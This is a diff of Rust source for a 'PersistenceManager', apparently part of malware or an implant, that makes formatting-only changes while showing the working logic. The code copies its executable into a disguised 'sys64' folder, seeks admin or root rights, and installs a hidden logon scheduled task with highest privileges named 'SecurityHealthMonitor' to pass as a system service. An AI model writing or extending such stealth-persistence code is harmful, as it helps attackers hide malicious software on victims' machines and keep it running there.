@@ -36,8 +36,12 @@ impl PersistenceManager {
         let target_exe = if let Some(path) = copy_to_path {
             if !path.is_empty() {
                 Self::copy_exe_to_target()
-            } else { None }
-        } else { None };
+            } else {
+                None
+            }
+        } else {
+            None
+        };
 
         // Step 2: Install scheduled task / cron — point to the copy if available
         if enable_persistence {
@@ -78,7 +82,10 @@ impl PersistenceManager {
                     1, // SW_SHOWNORMAL
                 );
                 if result as isize <= 32 {
-                    libra_common::dlog!("[!] Failed to request admin elevation (code: {})", result as isize);
+                    libra_common::dlog!(
+                        "[!] Failed to request admin elevation (code: {})",
+                        result as isize
+                    );
                 }
             }
             std::process::exit(0);
@@ -86,7 +93,9 @@ impl PersistenceManager {
         #[cfg(not(target_os = "windows"))]
         {
             let uid = unsafe { libc::getuid() };
-            if uid == 0 { return; }
+            if uid == 0 {
+                return;
+            }
             libra_common::dlog!("[!] Must run as root. Exiting.");
             std::process::exit(1);
         }
@@ -100,13 +109,16 @@ impl PersistenceManager {
 
         #[cfg(target_os = "windows")]
         let target_dir = {
-            let appdata = std::env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
+            let appdata = std::env::var("APPDATA")
+                .unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Roaming".into());
             std::path::PathBuf::from(appdata).join("sys64")
         };
         #[cfg(not(target_os = "windows"))]
         let target_dir = {
             let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
-            std::path::PathBuf::from(home).join(".local/share").join("sys64")
+            std::path::PathBuf::from(home)
+                .join(".local/share")
+                .join("sys64")
         };
 
         // Already at target — no need to copy again
@@ -141,9 +153,7 @@ impl PersistenceManager {
         }
         #[cfg(not(target_os = "windows"))]
         {
-            let _ = std::process::Command::new(target_exe)
-                .arg("--boot")
-                .spawn();
+            let _ = std::process::Command::new(target_exe).arg("--boot").spawn();
         }
 
         std::process::exit(0);
@@ -169,8 +179,7 @@ impl PersistenceManager {
         let task_name = "SecurityHealthMonitor";
         let _ = std::process::Command::new("schtasks.exe")
             .args([
-                "/create", "/tn", task_name, "/tr", &exe, "/sc", "onlogon",
-                "/rl", "highest", "/f",
+                "/create", "/tn", task_name, "/tr", &exe, "/sc", "onlogon", "/rl", "highest", "/f",
             ])
             .creation_flags(0x08000000)
             .stdout(std::process::Stdio::null())
@@ -209,10 +218,17 @@ fn is_windows_admin() -> bool {
     const TOKEN_ELEVATION: u32 = 20;
     #[link(name = "advapi32")]
     extern "system" {
-        fn OpenProcessToken(process: *mut core::ffi::c_void, access: u32, token: *mut *mut core::ffi::c_void) -> i32;
+        fn OpenProcessToken(
+            process: *mut core::ffi::c_void,
+            access: u32,
+            token: *mut *mut core::ffi::c_void,
+        ) -> i32;
         fn GetTokenInformation(
-            token: *mut core::ffi::c_void, class: u32, info: *mut core::ffi::c_void,
-            len: u32, ret: *mut u32,
+            token: *mut core::ffi::c_void,
+            class: u32,
+            info: *mut core::ffi::c_void,
+            len: u32,
+            ret: *mut u32,
         ) -> i32;
     }
     #[link(name = "kernel32")]
@@ -226,7 +242,9 @@ fn is_windows_admin() -> bool {
         if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 || token.is_null() {
             return false;
         }
-        let mut elevation = TokenElevation { token_is_elevated: 0 };
+        let mut elevation = TokenElevation {
+            token_is_elevated: 0,
+        };
         let mut ret: u32 = 0;
         let ok = GetTokenInformation(
             token,
